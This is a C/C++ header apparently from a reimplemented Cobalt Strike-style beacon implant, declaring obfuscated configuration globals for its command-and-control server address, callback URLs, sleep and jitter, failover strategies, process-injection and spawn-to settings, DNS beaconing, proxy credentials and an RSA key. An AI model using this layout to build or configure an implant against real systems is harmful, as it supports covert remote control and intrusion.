/**
* Created by ???.
* @Author : Galaxy
* @create rebeacon
*/
//自添加
#include <windows.h>
struct shark_unsignedstring{
    unsigned char* value;
    int flag = 0;
};
struct shark_string{
    char* value;
    int flag = 0;
};
struct shark_int{
    int value;
    int flag = 0;
};
struct shark_WORD{
    WORD value;
    int flag = 0;
};
struct shark_DWORD{
    DWORD value;
    int flag = 0;
};

//自添加
extern int shark_paths_size;
extern char* shark_path[];
//1
extern shark_int shark_flaghttpopen;

//8  8:   192.168.159.128,/j.ad
extern shark_string shark_serverip;
extern shark_string shark_ServerGetUrl;
//2
extern shark_int shark_ServerPort;


//10 在sharkinit中初始化位随机path
extern shark_string shark_ServerPostUrl;
//3
extern shark_int shark_dwMilliseconds;
//5
extern shark_int shark_jitter;

//67 是模式id
//2表示rotate或failover
//如果是random则是1 随机模式
//如果是round-robin则是0 默认模式
extern shark_int shark_strategyID;
//69 和failover(错误切换)有关 纯failover模式 69等于0
//当是按照错误次数切换的时候69等于指定次数
extern shark_int shark_failover_Strategy_number;
//70也与failover有关当是按照时间切换的时候70等于指定的时间
extern shark_int shark_failover_Strategy_time;
//68 如果是rotate模式 跟切换时间有关
extern shark_int shark_rotate_Strategy_time;

//9
extern shark_string shark_lpszAgent;

//43 权限
extern shark_int shark_bofrwx;
//44
extern shark_int shark_userwx;
//30
extern shark_string shark_post_ex_spawnto_x64;
//29
extern shark_string shark_post_ex_spawnto_x86;
//45 .process-inject.min_alloc
extern shark_int shark_min_alloc;

//51
extern shark_string shark_process_inject_execute;
// 47  .process-inject.transform-x64   256 bytes
extern shark_string shark_process_inject_transform_x64;
// 46
extern shark_string shark_process_inject_transform_x32;
//41
extern shark_int shark_BeaconCode;
//40 stop_data
extern shark_int shark_kill_data;
//54
extern shark_string shark_httpHeaderHost;
//12
extern shark_string shark_http_get_client_config;
//26 get or post
extern shark_string shark_verb;
//11   .http-get.server.output
extern shark_string shark_server_output_config;
//13 .http-post.client
extern shark_string shark_http_post_client_config;
//27 verb 指向包含在请求中使用的 HTTP 谓词的 以 null 结尾的字符串的指针。 如果此参数为 NULL，则函数使用 GET 作为 HTTP 谓词。
extern shark_string shark_http_verb;
//28 分块标志
extern shark_int shark_shouldChunkPosts;

//DNS 配置

//20 dns sleep  .dns-beacon.dns_sleep
extern shark_DWORD shark_dns_sleep;
//19 dns_idle   .dns-beacon.dns_idle
extern shark_DWORD shark_dns_idle;
//61 dns_get_A  .dns-beacon.get_A
extern shark_string shark_dns_get_A;
//62  dns_get_AAAA  .dns-beacon.get_AAAA
extern shark_string shark_dns_get_AAAA;
//63  dns_get_TXT .dns-beacon.get_TXT
extern shark_string shark_dns_get_TXT;
//66   dns监听器的配置选项dnsresolver
extern shark_string shark_dns_Listeneroptions_dnsresolver;


//35 判断是否需要设置http代理
extern shark_int shark_Proxyset;
//ProxyStrBuffer = get_str(32);
extern shark_string shark_ProxyStrBuffer;

//33  username_str proxy代理用户名
extern shark_string username_str;
//34  password_str proxy代理密码
extern shark_string password_str;

//59  header头
extern shark_string shark_lpszHeaders;


//31
extern shark_WORD shark_CryptoScheme;
//7  获取RSA公钥
extern shark_string shark_rsa_publickey;


unsigned char* decryptunsignedString(shark_unsignedstring var1);
//58 57 为子beacon的header


//39 BeaconCreateBackgroundThreads
extern shark_int shark_CreateBackgroundThreads;

//55
extern shark_int shark_exitflag;
//52
extern shark_int shark_virtualalloc;
//50
extern shark_int shark_usesCookieBeacon;
//42
extern shark_string shark_sleepsection;

//58
extern shark_string shark_58tcp;
//57
extern shark_string shark_57smb;
//102
extern shark_int shark_posturllength;
//103
extern shark_int shark_geturllength;

DWORD decryptDWORD(shark_DWORD var1);
WORD decryptWORD(shark_WORD var1);
char* decryptString(shark_string var1);
int decryptInt(shark_int var1);

void initGlobleVar();


